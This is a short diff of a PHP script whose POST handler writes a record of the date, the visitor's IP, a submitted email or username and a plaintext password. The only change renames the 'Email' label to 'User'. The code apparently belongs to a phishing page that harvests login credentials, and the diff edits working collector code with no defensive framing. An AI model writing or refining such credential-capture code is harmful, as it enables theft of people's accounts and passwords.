@@ -13,7 +13,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $data = "----------------------------\n";
     $data .= "Fecha: $fecha\n";
     $data .= "IP:    $ip\n";
-    $data .= "Email: $email\n";
+    $data .= "User: $email\n";
     $data .= "Pass:  $password\n";
     $data .= "----------------------------\n";
 
